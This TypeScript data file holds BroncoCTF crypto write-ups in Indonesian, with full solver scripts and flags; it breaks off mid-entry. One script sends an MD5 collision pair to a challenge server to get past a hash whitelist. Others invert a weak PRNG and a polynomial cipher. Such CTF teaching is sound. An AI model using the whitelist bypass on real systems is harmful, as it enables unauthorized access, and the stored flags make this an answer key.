import type { WriteUp } from '../types';

// BroncoCTF — 36 writeups
export const broncoCtfWriteups: WriteUp[] = [
  {
    "id": "broncoctf-crypto-blorgmultiplier",
    "title": "Blorg Multiplier",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Writeup for challenge Blorg Multiplier",
    "problemDescription": "Service memvalidasi command memakai:\n\n```python\nselect = hashlib.md5(bytes_in).hexdigest()\n\nif select not in valid:\n    print(\"That is not a real command!\")\n    return\n```\n\nAda dua masalah yang bisa digabung:\n\n1. Command `show` praktis tidak bisa dipakai karena hash yang disimpan di `valid` berbentuk uppercase, sedangkan `hexdigest()` selalu lowercase.\n2. Command `program` membolehkan user menambahkan hash MD5 command baru ke whitelist.\n\nSolusinya memakai **dua input berbeda dengan hash MD5 yang sama**:\n\n```text\nMD5(collision_A) == MD5(collision_B)\ncollision_A != collision_B\n```\n\n`collision_A` didaftarkan sebagai nama custom program. Setelah jumlah blorg tepat `468`, `collision_B` dikirim. Hash-nya lolos whitelist, tetapi string-nya tidak sama dengan nama program, sehingga masuk ke branch `else` yang mencetak flag.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Source yang relevan",
        "content": "```python\nelif user_in == \"program\":\n    if program is not None:\n        valid.remove(hashlib.md5(program.encode(\"latin-1\")).hexdigest())\n\n    program = input(\"What is the name of the new command? \")\n    program_cmd = input(\n        \"Which (space separated) commands would you like it to run:\"\n    )\n\n    valid.add(hashlib.md5(program.encode(\"latin-1\")).hexdigest())\n```\n\nBranch flag:\n\n```python\nelif user_in == program:\n    for cmd in program_cmd.split(\" \"):\n        handle_input(cmd.encode(\"latin-1\"))\nelse:\n    if blorgs == TARGET:\n        print(f\"Wow! You earned the flag: {FLAG}\")\n```\n\nCollision kedua harus:\n\n- memiliki MD5 yang sama agar lolos `valid`\n- berbeda secara byte/string agar tidak masuk ke `user_in == program`"
      },
      {
        "title": "Mengatur blorg menjadi 468",
        "content": "Nilai awal:\n\n```text\nblorgs = 1\nMAX_EDITS = 3\n```\n\nPerintah:\n\n```python\nincrease: (blorgs + 1) * 2\ndecrease: (blorgs - 1) * 2\nnone: blorgs * 2\n```\n\nGunakan urutan:\n\n```text\nnone\nnone\nnone\nnone\ndecrease\nnone\ndecrease\ndecrease\nnone\n```\n\nPerubahannya:\n\n```text\n1\n-> 2       none\n-> 4       none\n-> 8       none\n-> 16      none\n-> 30      decrease, edit 1\n-> 60      none\n-> 118     decrease, edit 2\n-> 234     decrease, edit 3\n-> 468     none\n```\n\nJumlah edit tepat tiga.\n\nLoop masih berjalan saat `blorgs == 468` karena kondisinya memakai `<=`:\n\n```python\nwhile blorgs <= TARGET and edits <= MAX_EDITS:\n```"
      },
      {
        "title": "MD5 collision",
        "content": "Solver memakai collision pair MD5 klasik berukuran 128 byte. Keduanya memiliki digest:\n\n```text\n79054025255fb1a26e4bc422aef54eb4\n```\n\nValidasi lokal:\n\n```python\nassert collision_a != collision_b\nassert hashlib.md5(collision_a).digest() == hashlib.md5(collision_b).digest()\n```"
      },
      {
        "title": "Masalah encoding remote",
        "content": "Payload collision mengandung byte non-ASCII. Service membaca input sebagai string, lalu mengubahnya kembali dengan Latin-1:\n\n```python\nuser_in = bytes_in.decode(\"latin-1\")\n```\n\nSaat mendaftarkan program:\n\n```python\nprogram.encode(\"latin-1\")\n```\n\nAgar byte mentah collision tetap sama setelah melewati terminal UTF-8:\n\n```python\nwire = raw.decode(\"latin-1\").encode(\"utf-8\")\n```\n\nUrutannya:\n\n```text\nraw collision bytes\n-> decode latin-1 menjadi Unicode\n-> encode UTF-8 untuk dikirim\n-> input() membaca Unicode yang sama\n-> encode latin-1 di server\n-> kembali menjadi raw collision bytes\n```"
      },
      {
        "title": "Solver",
        "content": "Dependency:\n\n```bash\npython3 -m pip install pwntools\n```\n\nJalankan:\n\n```bash\npython3 solve.py 0.cloud.chals.io 13758\n```\n\nAlur solver:\n\n1. Validasi collision pair.\n2. Kirim `program`.\n3. Daftarkan `collision_A` sebagai nama command.\n4. Jalankan sequence sampai blorg menjadi `468`.\n5. Kirim `collision_B`.\n6. Ambil flag dari response.\n\nOutput:\n\n```text\n<FLAG>bronco{ple4s3_d0nt_l3ak_fl4g}</FLAG>\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport hashlib\r\nimport re\r\nimport sys\r\n\r\nfrom pwn import context, remote\r\n\r\n\r\n# Classic 128-byte MD5 collision pair.\r\n# Both byte strings hash to:\r\n#   79054025255fb1a26e4bc422aef54eb4\r\n#\r\n# They contain no LF byte, so they can be submitted through input().\r\nCOLLISION_A = bytes.fromhex(\r\n    \"d131dd02c5e6eec4693d9a0698aff95c\"\r\n    \"2fcab58712467eab4004583eb8fb7f89\"\r\n    \"55ad340609f4b30283e488832571415a\"\r\n    \"085125e8f7cdc99fd91dbdf280373c5b\"\r\n    \"d8823e3156348f5bae6dacd436c919c6\"\r\n    \"dd53e2b487da03fd02396306d248cda0\"\r\n    \"e99f33420f577ee8ce54b67080a80d1e\"\r\n    \"c69821bcb6a8839396f9652b6ff72a70\"\r\n)\r\n\r\nCOLLISION_B = bytes.fromhex(\r\n    \"d131dd02c5e6eec4693d9a0698aff95c\"\r\n    \"2fcab50712467eab4004583eb8fb7f89\"\r\n    \"55ad340609f4b30283e4888325f1415a\"\r\n    \"085125e8f7cdc99fd91dbd7280373c5b\"\r\n    \"d8823e3156348f5bae6dacd436c919c6\"\r\n    \"dd53e23487da03fd02396306d248cda0\"\r\n    \"e99f33420f577ee8ce54b67080280d1e\"\r\n    \"c69821bcb6a8839396f965ab6ff72a70\"\r\n)\r\n\r\nFLAG_RE = re.compile(rb\"bronco\\{[^}\\r\\n]+\\}\")\r\n\r\n\r\ndef to_wire(raw: bytes) -> bytes:\r\n    \"\"\"\r\n    Remote input() decodes UTF-8, then the challenge re-encodes with latin-1.\r\n\r\n    Mapping arbitrary collision bytes through latin-1 -> UTF-8 makes the\r\n    challenge recover the exact original byte sequence before hashing.\r\n    \"\"\"\r\n    return raw.decode(\"latin-1\").encode(\"utf-8\")\r\n\r\n\r\ndef validate_collision() -> None:\r\n    digest_a = hashlib.md5(COLLISION_A).hexdigest()\r\n    digest_b = hashlib.md5(COLLISION_B).hexdigest()\r\n\r\n    if COLLISION_A == COLLISION_B:\r\n        raise RuntimeError(\"Collision blocks unexpectedly identical\")\r\n    if digest_a != digest_b:\r\n        raise RuntimeError(\"Embedded MD5 collision pair is invalid\")\r\n    if b\"\\n\" in COLLISION_A or b\"\\n\" in COLLISION_B:\r\n        raise RuntimeError(\"Collision block contains LF and cannot use input()\")\r\n\r\n\r\ndef send_command(io, command: bytes) -> None:\r\n    io.sendlineafter(b\"> \", command)\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(\r\n        description=\"Solve BroncoCTF Blorg Multiplier\"\r\n    )\r\n    parser.add_argument(\r\n        \"host\",\r\n        nargs=\"?\",\r\n        default=\"0.cloud.chals.io\",\r\n        help=\"remote host\",\r\n    )\r\n    parser.add_argument(\r\n        \"port\",\r\n        nargs=\"?\",\r\n        type=int,\r\n        default=13758,\r\n        help=\"remote port\",\r\n    )\r\n    parser.add_argument(\r\n        \"--debug\",\r\n        action=\"store_true\",\r\n        help=\"enable pwntools debug logging\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    validate_collision()\r\n    context.log_level = \"debug\" if args.debug else \"error\"\r\n\r\n    io = remote(args.host, args.port)\r\n\r\n    # Register COLLISION_A as the custom command name.\r\n    send_command(io, b\"program\")\r\n    io.sendlineafter(\r\n        b\"What is the name of the new command? \",\r\n        to_wire(COLLISION_A),\r\n    )\r\n\r\n    # The command body is irrelevant because COLLISION_A is never invoked.\r\n    io.sendlineafter(\r\n        b\"Which (space separated) commands would you like it to run:\",\r\n        b\"none\",\r\n    )\r\n\r\n    # Reach exactly 468 with only three edits:\r\n    #\r\n    # 1 -> 2 -> 4 -> 8 -> 16\r\n    #   decrease -> 30\r\n    #   none     -> 60\r\n    #   decrease -> 118\r\n    #   decrease -> 234\r\n    #   none     -> 468\r\n    sequence = [\r\n        b\"none\",\r\n        b\"none\",\r\n        b\"none\",\r\n        b\"none\",\r\n        b\"decrease\",\r\n        b\"none\",\r\n        b\"decrease\",\r\n        b\"decrease\",\r\n        b\"none\",\r\n    ]\r\n\r\n    for command in sequence:\r\n        send_command(io, command)\r\n\r\n    # COLLISION_B has the same MD5 as the registered program command, so it\r\n    # passes the whitelist. It is not equal to COLLISION_A, therefore it skips\r\n    # the `user_in == program` branch and falls into the flag-checking `else`.\r\n    send_command(io, to_wire(COLLISION_B))\r\n\r\n    data = io.recvrepeat(3)\r\n    match = FLAG_RE.search(data)\r\n\r\n    if match is None:\r\n        print(data.decode(\"utf-8\", errors=\"replace\"))\r\n        raise RuntimeError(\"Flag tidak ditemukan pada response remote\")\r\n\r\n    flag = match.group(0).decode(\"ascii\")\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    try:\r\n        main()\r\n    except (EOFError, OSError, RuntimeError) as error:\r\n        print(f\"[-] {error}\", file=sys.stderr)\r\n        raise SystemExit(1)"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{ple4s3_d0nt_l3ak_fl4g}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-crypto-consistentlystaticpsuedorandomnumbergenerator",
    "title": "Consistently Static Psuedo Random Number Generator",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Writeup for challenge Consistently Static Psuedo Random Number Generator",
    "problemDescription": "> I made a birthday oracle recently, but I can't get it to work at all. It only gets the day of the week right 14% of the time!\n>\n> Here are my results from the last testing session... can you take a look at it and see what's wrong?\n\nFile yang diberikan berisi source generator dan 101 keluaran oracle. State RNG diisi langsung dengan byte flag, jadi targetnya bukan memprediksi tanggal lahir, tetapi membalik proses update state sampai byte awalnya kembali.",
    "tools": [],
    "analysis": "Setiap output `guess` tidak dicetak sebagai angka. Nilainya dipecah menjadi tiga indeks:\n\n```python\nmonth = months[guess % 12]\nday   = days[guess % 7]\narea  = areas[guess % 5]\n```\n\nArtinya satu baris transcript membocorkan:\n\n```text\nguess mod 12\nguess mod 7\nguess mod 5\n```\n\nModulus `12`, `7`, dan `5` saling koprima, dengan hasil kali `420`. Karena `guess` selalu satu byte (`0..255`), setiap kombinasi month/day/area menunjuk ke tepat satu nilai.\n\nContoh baris pertama:\n\n```text\nOctober, Saturday, the Americas\n```\n\nIndeksnya:\n\n```text\nOctober      -> 9 mod 12\nSaturday     -> 5 mod 7\nthe Americas -> 2 mod 5\n```\n\nBrute force pada rentang byte menghasilkan:\n\n```text\nguess = 117\n```\n\nProses yang sama pada seluruh transcript menghasilkan 101 byte output RNG.\n\n### Menentukan panjang state\n\nSetelah schedule mengulang, posisi yang ditimpa pada iterasi `t+n` sebelumnya berisi `a_t`. Relasinya menjadi:\n\n```text\na_(t+n+1) = 2a_(t+n) - a_t mod 256\n```\n\nSolver mencoba seluruh kandidat `n` dan memvalidasi relasi itu ke semua output yang tersedia. Hanya satu nilai yang cocok:\n\n```text\nn = 34\n```",
    "solution": [
      {
        "title": "Membalik update state",
        "content": "Misalkan:\n\n- `a_t` adalah output pada iterasi ke-`t`\n- `x_t` adalah byte lama yang ditimpa pada iterasi tersebut\n\nSource melakukan:\n\n```python\na = sum(state) % 256\nstate[schedule[index]] = a\n```\n\nSesudah `x_t` diganti menjadi `a_t`, jumlah state berikutnya adalah:\n\n```text\na_(t+1) = a_t - x_t + a_t mod 256\n          = 2a_t - x_t mod 256\n```\n\nJadi byte lama dapat dihitung langsung:\n\n```text\nx_t = 2a_t - a_(t+1) mod 256\n```\n\nSelama satu putaran schedule, setiap posisi state ditimpa tepat sekali. Maka `x_0` sampai `x_(n-1)` adalah seluruh byte flag asli, hanya urutannya mengikuti schedule acak."
      },
      {
        "title": "Mengembalikan urutan flag",
        "content": "Schedule dibuat dengan dua operasi:\n\n1. rotasi `range(n)`\n2. kemungkinan membalik seluruh schedule\n\nByte awal yang didapat dalam urutan schedule adalah:\n\n```text\n1_0tpyrc{ocnorb\\n}ni4tr3c_4_3ruce5n\n```\n\nSolver mencoba seluruh rotasi dan dua arah schedule. Kombinasi yang benar:\n\n```text\nshift    = 15\nreversed = True\n```\n\nState awalnya menjadi:\n\n```text\nbronco{crypt0_1n5ecur3_4_c3rt4in}\\n\n```\n\nNewline berasal dari `flag.txt` dan bukan bagian flag."
      },
      {
        "title": "Solver",
        "content": "Jalankan:\n\n```bash\npython3 solve.py result.txt\n```\n\nOutput:\n\n```text\n[+] outputs parsed : 101\n[+] state length   : 34\n[+] schedule shift : 15\n[+] reversed       : True\n<FLAG>bronco{crypt0_1n5ecur3_4_c3rt4in}</FLAG>\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport re\r\nfrom pathlib import Path\r\n\r\nMONTHS = [\r\n    \"January\", \"February\", \"March\", \"April\", \"May\", \"June\",\r\n    \"July\", \"August\", \"September\", \"October\", \"November\", \"December\",\r\n]\r\nDAYS = [\r\n    \"Monday\", \"Tuesday\", \"Wednesday\", \"Thursday\",\r\n    \"Friday\", \"Saturday\", \"Sunday\",\r\n]\r\nAREAS = [\"Asia\", \"Africa\", \"the Americas\", \"Europe\", \"Australia\"]\r\n\r\nLINE_RE = re.compile(\r\n    r\"I see it now: you were born in \"\r\n    r\"(January|February|March|April|May|June|July|August|September|October|November|December)\"\r\n    r\"\\.\\.\\. on a \"\r\n    r\"(Monday|Tuesday|Wednesday|Thursday|Friday|Saturday|Sunday), in \"\r\n    r\"(Asia|Africa|the Americas|Europe|Australia)\"\r\n)\r\nFLAG_RE = re.compile(rb\"bronco\\{[^}\\r\\n]+\\}\")\r\n\r\n\r\ndef recover_output_byte(month: str, day: str, area: str) -> int:\r\n    \"\"\"Recover guess in [0, 255] from its residues modulo 12, 7, and 5.\"\"\"\r\n    residues = (MONTHS.index(month), DAYS.index(day), AREAS.index(area))\r\n    matches = [\r\n        value\r\n        for value in range(256)\r\n        if value % 12 == residues[0]\r\n        and value % 7 == residues[1]\r\n        and value % 5 == residues[2]\r\n    ]\r\n    if len(matches) != 1:\r\n        raise ValueError(\r\n            f\"oracle tuple is not unique: {(month, day, area)!r} -> {matches}\"\r\n        )\r\n    return matches[0]\r\n\r\n\r\ndef parse_outputs(text: str) -> list[int]:\r\n    observations = LINE_RE.findall(text)\r\n    if not observations:\r\n        raise ValueError(\"no oracle output lines were found\")\r\n    return [recover_output_byte(*observation) for observation in observations]\r\n\r\n\r\ndef infer_state_length(outputs: list[int]) -> int:\r\n    \"\"\"\r\n    After one full schedule cycle of length n:\r\n        a[t+n+1] = 2*a[t+n] - a[t] (mod 256)\r\n    \"\"\"\r\n    candidates = []\r\n    for n in range(1, len(outputs) // 2 + 1):\r\n        checks = len(outputs) - n - 1\r\n        if checks < n:\r\n            continue\r\n        if all(\r\n            outputs[t + n + 1] == (2 * outputs[t + n] - outputs[t]) % 256\r\n            for t in range(checks)\r\n        ):\r\n            candidates.append(n)\r\n\r\n    if len(candidates) != 1:\r\n        raise ValueError(f\"could not uniquely infer state length: {candidates}\")\r\n    return candidates[0]\r\n\r\n\r\ndef recover_schedule_order_bytes(outputs: list[int], n: int) -> bytes:\r\n    \"\"\"\r\n    Let a[t] be the sum before update t and x[t] the overwritten old byte.\r\n    Since a[t+1] = 2*a[t] - x[t] mod 256:\r\n        x[t] = 2*a[t] - a[t+1] mod 256\r\n    The first n overwritten bytes are the original state in schedule order.\r\n    \"\"\"\r\n    return bytes((2 * outputs[t] - outputs[t + 1]) % 256 for t in range(n))\r\n\r\n\r\ndef rebuild_states(schedule_bytes: bytes):\r\n    \"\"\"Try every allowed rotation and optional schedule reversal.\"\"\"\r\n    n = len(schedule_bytes)\r\n    for shift in range(n):\r\n        schedule = list(range(n))\r\n        schedule = schedule[shift:] + schedule[:shift]\r\n\r\n        for reversed_schedule in (False, True):\r\n            current_schedule = schedule[::-1] if reversed_schedule else schedule\r\n            state = bytearray(n)\r\n            for value, index in zip(schedule_bytes, current_schedule):\r\n                state[index] = value\r\n            yield shift, reversed_schedule, bytes(state)\r\n\r\n\r\ndef solve(text: str) -> tuple[str, int, int, bool]:\r\n    outputs = parse_outputs(text)\r\n    n = infer_state_length(outputs)\r\n    schedule_bytes = recover_schedule_order_bytes(outputs, n)\r\n\r\n    matches = []\r\n    for shift, reversed_schedule, state in rebuild_states(schedule_bytes):\r\n        match = FLAG_RE.search(state)\r\n        if match:\r\n            matches.append(\r\n                (match.group().decode(\"ascii\"), shift, reversed_schedule, state)\r\n            )\r\n\r\n    unique_flags = {item[0] for item in matches}\r\n    if len(unique_flags) != 1:\r\n        raise ValueError(f\"flag recovery was ambiguous: {sorted(unique_flags)}\")\r\n\r\n    flag = unique_flags.pop()\r\n    exact = next(item for item in matches if item[3].startswith(flag.encode()))\r\n    return flag, n, exact[1], exact[2]\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(\r\n        description=\"Recover the flag from the birthday-oracle transcript\"\r\n    )\r\n    parser.add_argument(\"transcript\", type=Path, help=\"path to result.txt/transcript\")\r\n    args = parser.parse_args()\r\n\r\n    text = args.transcript.read_text(encoding=\"utf-8\", errors=\"replace\")\r\n    flag, state_length, shift, reversed_schedule = solve(text)\r\n\r\n    print(f\"[+] outputs parsed : {len(parse_outputs(text))}\")\r\n    print(f\"[+] state length   : {state_length}\")\r\n    print(f\"[+] schedule shift : {shift}\")\r\n    print(f\"[+] reversed       : {reversed_schedule}\")\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{crypt0_1n5ecur3_4_c3rt4in}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-crypto-customcipher",
    "title": "Custom Cipher",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "- **CTF:** BroncoCTF\n- **Category:** Misc\n- **Difficulty:** Easy\n- **Flag:** `bronco{f4ct0r1ng_i5_fr3e???}`",
    "problemDescription": "- **CTF:** BroncoCTF\n- **Category:** Misc\n- **Difficulty:** Easy\n- **Flag:** `bronco{f4ct0r1ng_i5_fr3e???}`",
    "tools": [],
    "analysis": "Skema memakai polinomial dengan akar bilangan bulat.\n\nPublic key dibuat seperti ini:\n\n```python\npublic = Poly([1])\nfor root in private:\n    public = public * Poly([-root, 1])\n```\n\nSecara matematis:\n\n```text\nP(x) = ∏(x - rᵢ)\n```\n\nSaat mengenkripsi empat karakter, program tidak melakukan operasi modular atau transformasi satu arah. Ia hanya menambahkan empat faktor baru ke public key:\n\n```python\nfor root in message:\n    public = public * Poly([-root, 1])\n```\n\nUntuk satu blok plaintext `[m₀, m₁, m₂, m₃]`, ciphertext-nya adalah:\n\n```text\nC(x) = P(x) · (x - m₀)(x - m₁)(x - m₂)(x - m₃)\n```\n\nKarena `P(x)` dikirim sebagai public key, ciphertext dapat dibagi langsung:\n\n```text\nM(x) = C(x) / P(x)\n     = (x - m₀)(x - m₁)(x - m₂)(x - m₃)\n```\n\nTidak perlu mengetahui private roots. Quotient selalu polinomial monic derajat empat dengan akar berupa nilai ASCII karakter plaintext.",
    "solution": [
      {
        "title": "Format Koefisien",
        "content": "`Poly` menyimpan koefisien secara ascending:\n\n```text\n[c₀, c₁, c₂, ..., cₙ]\n```\n\nTetapi `to_distrib_form()` mencetak:\n\n```python\nself.coeff[:-1]\n```\n\nKoefisien tertinggi tidak disertakan karena selalu `1`. Saat parsing, solver menambahkannya kembali:\n\n```python\ncoefficients = parsed_values + [1]\n```\n\nPublic key mempunyai derajat 64, sedangkan setiap ciphertext mempunyai derajat 68. Pembagian exact menghasilkan lima koefisien untuk polinomial derajat empat."
      },
      {
        "title": "Mengembalikan Urutan Karakter",
        "content": "Akar polinomial hanya memberi multiset karakter. Program menyimpan urutan aslinya dalam integer tambahan:\n\n```python\norder = sorted(message)\n\nfor i, e in enumerate(order):\n    ind = message.index(e)\n    order[i] = ind\n    message[ind] = -1\n\norder = sum([x << (2 * i) for i, x in enumerate(order)])\n```\n\nSetiap indeks asli menggunakan dua bit karena satu blok berisi empat karakter.\n\nDecode-nya:\n\n```python\noriginal_index = (encoded_order >> (2 * sorted_index)) & 3\n```\n\nNilai akar yang sudah diurutkan ditempatkan kembali ke `original_index`."
      },
      {
        "title": "Contoh Blok Pertama",
        "content": "Pembagian ciphertext pertama dengan public key menghasilkan:\n\n```text\n136410120 - 5057532x + 70234x² - 433x³ + x⁴\n```\n\nAkarnya:\n\n```text\n98, 110, 111, 114\n```\n\nDalam ASCII:\n\n```text\nb, n, o, r\n```\n\nNilai order blok pertama adalah `108`:\n\n```text\n108 = 0b01101100\n```\n\nField dua bitnya menghasilkan indeks:\n\n```text\n[0, 3, 2, 1]\n```\n\nSetelah karakter dikembalikan ke indeks asli:\n\n```text\nbron\n```"
      },
      {
        "title": "Hasil Seluruh Blok",
        "content": "```text\nbron\nco{f\n4ct0\nr1ng\n_i5_\nfr3e\n???}\n```\n\nGabungannya:\n\n```text\nbronco{f4ct0r1ng_i5_fr3e???}\n```\n\nTiga tanda tanya adalah karakter literal. Akar blok terakhir memang bernilai `63`, yaitu ASCII `?`."
      },
      {
        "title": "Menjalankan Solver",
        "content": "```bash\npython3 solve.py enc.txt\n```\n\nOutput:\n\n```text\nbronco{f4ct0r1ng_i5_fr3e???}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport sys\r\nfrom pathlib import Path\r\n\r\n\r\ndef divide_monic(numerator: list[int], denominator: list[int]) -> list[int]:\r\n    \"\"\"Exact polynomial division for ascending coefficients and monic denominator.\"\"\"\r\n    if not denominator or denominator[-1] != 1:\r\n        raise ValueError(\"Denominator must be monic\")\r\n\r\n    if len(numerator) < len(denominator):\r\n        raise ValueError(\"Numerator degree is smaller than denominator degree\")\r\n\r\n    remainder = numerator[:]\r\n    quotient = [0] * (len(numerator) - len(denominator) + 1)\r\n    denominator_degree = len(denominator) - 1\r\n\r\n    for shift in range(len(quotient) - 1, -1, -1):\r\n        factor = remainder[denominator_degree + shift]\r\n        quotient[shift] = factor\r\n\r\n        for index, coefficient in enumerate(denominator):\r\n            remainder[index + shift] -= factor * coefficient\r\n\r\n    if any(remainder):\r\n        raise ValueError(\"Ciphertext is not exactly divisible by the public key\")\r\n\r\n    return quotient\r\n\r\n\r\ndef evaluate(coefficients: list[int], value: int) -> int:\r\n    \"\"\"Evaluate ascending polynomial coefficients with Horner's method.\"\"\"\r\n    result = 0\r\n    for coefficient in reversed(coefficients):\r\n        result = result * value + coefficient\r\n    return result\r\n\r\n\r\ndef divide_by_linear(coefficients: list[int], root: int) -> list[int]:\r\n    \"\"\"Divide an ascending polynomial by (x - root).\"\"\"\r\n    degree = len(coefficients) - 1\r\n    if degree < 1:\r\n        raise ValueError(\"Polynomial is constant\")\r\n\r\n    quotient = [0] * degree\r\n    quotient[-1] = coefficients[-1]\r\n\r\n    for index in range(degree - 2, -1, -1):\r\n        quotient[index] = coefficients[index + 1] + root * quotient[index + 1]\r\n\r\n    remainder = coefficients[0] + root * quotient[0]\r\n    if remainder != 0:\r\n        raise ValueError(f\"{root} is not a root\")\r\n\r\n    return quotient\r\n\r\n\r\ndef recover_roots(polynomial: list[int], count: int = 4) -> list[int]:\r\n    \"\"\"Recover byte-sized integer roots, including repeated roots.\"\"\"\r\n    current = polynomial[:]\r\n    roots: list[int] = []\r\n\r\n    for _ in range(count):\r\n        root = next(\r\n            (candidate for candidate in range(256) if evaluate(current, candidate) == 0),\r\n            None,\r\n        )\r\n        if root is None:\r\n            raise ValueError(f\"Could not find a byte-sized root in {current}\")\r\n\r\n        roots.append(root)\r\n        current = divide_by_linear(current, root)\r\n\r\n    return sorted(roots)\r\n\r\n\r\ndef restore_order(sorted_values: list[int], encoded_order: int) -> bytes:\r\n    \"\"\"\r\n    The challenge stores the original index of each sorted message byte\r\n    in successive 2-bit fields.\r\n    \"\"\"\r\n    output = [0] * len(sorted_values)\r\n\r\n    for sorted_index, value in enumerate(sorted_values):\r\n        original_index = (encoded_order >> (2 * sorted_index)) & 0b11\r\n        output[original_index] = value\r\n\r\n    return bytes(output)\r\n\r\n\r\ndef parse_challenge(path: Path) -> tuple[list[int], list[tuple[list[int], int]]]:\r\n    text = path.read_text(encoding=\"utf-8\")\r\n\r\n    try:\r\n        public_section, message_section = (\r\n            text.split(\"====PUBLIC KEY====\", 1)[1]\r\n            .split(\"====MESSAGE====\", 1)\r\n        )\r\n    except (IndexError, ValueError) as exc:\r\n        raise ValueError(\"Invalid challenge file format\") from exc\r\n\r\n    # to_distrib_form() omits the final monic coefficient.\r\n    public_key = [int(value) for value in public_section.split()] + [1]\r\n\r\n    blocks: list[tuple[list[int], int]] = []\r\n    for raw_block in message_section.strip().split(\"/\"):\r\n        values = [int(value) for value in raw_block.split()]\r\n        if len(values) < 2:\r\n            raise ValueError(\"Malformed ciphertext block\")\r\n\r\n        encoded_order = values[-1]\r\n        ciphertext = values[:-1] + [1]\r\n        blocks.append((ciphertext, encoded_order))\r\n\r\n    return public_key, blocks\r\n\r\n\r\ndef solve(path: Path) -> bytes:\r\n    public_key, blocks = parse_challenge(path)\r\n    plaintext = bytearray()\r\n\r\n    for ciphertext, encoded_order in blocks:\r\n        # C(x) = P(x) * product(x - message_byte)\r\n        message_polynomial = divide_monic(ciphertext, public_key)\r\n        sorted_message_bytes = recover_roots(message_polynomial)\r\n        plaintext.extend(restore_order(sorted_message_bytes, encoded_order))\r\n\r\n    return bytes(plaintext).rstrip(b\"\\x00\")\r\n\r\n\r\ndef main() -> None:\r\n    input_path = Path(sys.argv[1] if len(sys.argv) > 1 else \"enc.txt\")\r\n    plaintext = solve(input_path)\r\n\r\n    try:\r\n        print(plaintext.decode(\"ascii\"))\r\n    except UnicodeDecodeError:\r\n        print(plaintext)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{f4ct0r1ng_i5_fr3e???}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-crypto-emojibius",
    "title": "Emojibius",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "- **CTF:** BroncoCTF\n- **Category:** Misc\n- **Difficulty:** Easy\n- **Flag:** `bronco{em0j1s_r_cr1ng3}`",
    "problemDescription": "- **CTF:** BroncoCTF\n- **Category:** Misc\n- **Difficulty:** Easy\n- **Flag:** `bronco{em0j1s_r_cr1ng3}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Artefak",
        "content": "Challenge memberi dua file:\n\n```text\nartifact.png\nintercepted_signals.txt\n```\n\n`artifact.png` menampilkan lima emoji di dahi:\n\n```text\n🍎 🦊 🍐 🐶 🎈\n```\n\nDi pipi terdapat susunan karakter 5×5:\n\n```text\nb r o n c\n{ e m 0 j\n1 s _ g 3\n} a d f h\ni k l p q\n```\n\nJudul `Emojibius` mengarah ke Polybius square. Lima emoji dipakai sebagai label baris dan kolom dalam urutan yang sama."
      },
      {
        "title": "Tabel Decode",
        "content": "|     | 🍎 | 🦊 | 🍐 | 🐶 | 🎈 |\n|-----|----|----|----|----|----|\n| 🍎 | b | r | o | n | c |\n| 🦊 | { | e | m | 0 | j |\n| 🍐 | 1 | s | _ | g | 3 |\n| 🐶 | } | a | d | f | h |\n| 🎈 | i | k | l | p | q |\n\nEmoji pertama menentukan baris, emoji kedua menentukan kolom.\n\nContoh:\n\n```text\n🍎🍎 -> row 🍎, column 🍎 -> b\n🍎🦊 -> row 🍎, column 🦊 -> r\n🍎🍐 -> row 🍎, column 🍐 -> o\n🍎🐶 -> row 🍎, column 🐶 -> n\n🍎🎈 -> row 🍎, column 🎈 -> c\n```\n\nLima token pertama langsung membentuk:\n\n```text\nbronc\n```\n\nToken keenam:\n\n```text\n🍎🍐 -> o\n```\n\nPrefix lengkapnya menjadi:\n\n```text\nbronco\n```"
      },
      {
        "title": "Decode Seluruh Transmission",
        "content": "Ciphertext:\n\n```text\n🍎🍎 🍎🦊 🍎🍐 🍎🐶 🍎🎈 🍎🍐\n🦊🍎 🦊🦊 🦊🍐 🦊🐶 🦊🎈\n🍐🍎 🍐🦊 🍐🍐\n🍎🦊 🍐🍐 🍎🎈 🍎🦊 🍐🍎 🍎🐶 🍐🐶 🍐🎈\n🐶🍎\n```\n\nHasil per bagian:\n\n```text\nbronco\n{em0j\n1s_\nr_cr1ng3\n}\n```\n\nSetelah digabung:\n\n```text\nbronco{em0j1s_r_cr1ng3}\n```"
      },
      {
        "title": "Solver",
        "content": "```bash\npython3 solve.py intercepted_signals.txt\n```\n\nOutput:\n\n```text\nbronco{em0j1s_r_cr1ng3}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
